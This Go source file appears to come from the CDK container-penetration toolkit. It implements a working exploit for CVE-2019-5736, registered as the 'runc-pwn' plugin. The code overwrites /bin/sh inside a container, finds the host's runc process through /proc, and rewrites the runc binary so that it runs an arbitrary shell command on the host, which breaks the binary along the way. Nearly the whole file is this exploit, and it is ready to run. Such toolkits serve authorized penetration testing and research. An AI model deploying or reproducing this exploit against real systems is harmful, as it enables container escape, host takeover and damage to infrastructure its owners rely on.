// +build !no_docker_runc


/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package exploit

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strconv"
	"strings"

	"github.com/cdk-team/CDK/pkg/cli"
	"github.com/cdk-team/CDK/pkg/plugin"
	"github.com/cdk-team/CDK/pkg/util"
)

// CVE-2019-5736 exploit copied from https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go
func dockerRuncPwn(hijackCommand string) {

	if hijackCommand == "nil" {
		fmt.Println("[-] Please provide a payload")
		return
	}

	payload := fmt.Sprintf("#!/bin/bash \n %s", hijackCommand)
	fd, err := os.Create("/bin/sh")
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Fprintln(fd, "#!/proc/self/exe")
	err = fd.Close()
	if err != nil {
		fmt.Println(err)
		return
	}

	var found = -1
	pids, err := ioutil.ReadDir("/proc")
	fmt.Println(pids)
	if err != nil {
		fmt.Println("err found when reading /proc dir:", err)
		return
	}

	for _, f := range pids {
		// drop non-pid
		pidDir := "/proc/" + f.Name()
		if !util.IsDir(pidDir) {
			continue
		}

		fint, err := strconv.Atoi(f.Name())
		if err != nil {
			continue
		}
		fbytes, err := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
		if err != nil {
			continue
		}
		fstring := string(fbytes)
		fmt.Println(fstring)
		if strings.Contains(fstring, "runc") && !strings.Contains(fstring, "runc-pwn") {
			fmt.Println("\tmatched pid - ", f.Name())
			found = fint
			break
		}
	}
	if found == -1 {
		fmt.Println("\tcannot find RunC process inside container, exit.")
		return
	}
	var handleFd = -1
	for handleFd == -1 {
		handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
		if int(handle.Fd()) > 0 {
			handleFd = int(handle.Fd())
		}
	}
	for {
		writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
		if int(writeHandle.Fd()) > 0 {
			writeHandle.Write([]byte(payload))
			log.Println("Successfully got write handle", writeHandle)
			log.Println("The command executed is", payload)
			return
		}
	}
}

// plugin interface
type dockerRuncPwnS struct{}

func (p dockerRuncPwnS) Desc() string {
	return "container escape via CVE-2019-5736. usage: ./cdk run runc-pwn <shell-cmd>"
}
func (p dockerRuncPwnS) Run() bool {
	args := cli.Args["<args>"].([]string)
	if len(args) != 1 {
		log.Println("invalid input args.")
		log.Fatal(p.Desc())
	}
	cmd := args[0]
	log.Println("THIS EXPLOIT WILL OVERWRITE RUNC BINARY AND BREAK CI/CD, BACKUP YOUR RUNC BINARY FIRST!")
	log.Println("Shellcode will be trigger when an execve() call in container or the container is manually stopped.")
	log.Println("Exploit CVE-2019-5736 with shellcode commands: ", cmd)
	dockerRuncPwn(cmd)
	log.Println("Finished.")
	return true
}

func init() {
	exploit := dockerRuncPwnS{}
	plugin.RegisterExploit("runc-pwn", exploit)
}
